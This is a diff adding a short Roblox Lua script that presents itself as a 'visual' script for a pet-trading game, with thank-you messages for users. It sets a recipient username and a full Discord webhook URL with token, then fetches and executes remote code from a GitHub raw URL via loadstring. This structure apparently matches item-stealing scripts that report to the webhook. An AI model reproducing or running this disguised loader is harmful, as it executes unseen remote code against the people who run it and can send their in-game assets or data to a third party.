@@ -1,0 +1,9 @@
+Username = "ashleypaglinawan11"
+WebHook = "https://discord.com/api/webhooks/1099279951787728897/UlgNrxHxhR0hNU49lrgpq6X1O5ykYcpzJrmy43W-EjBrdhIBbukDTV6dtz7zLZnKd4XK"
+loadingscreen = true
+_G.CustomScriptName = "Xueey Visual"
+_G.Text1 = "Join My Discord"
+_G.Text2 = "Discord In MY YT CHANNEL"
+_G.Text3 = "thank you for using my script"
+_G.Text4 = "enjoy!!!"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
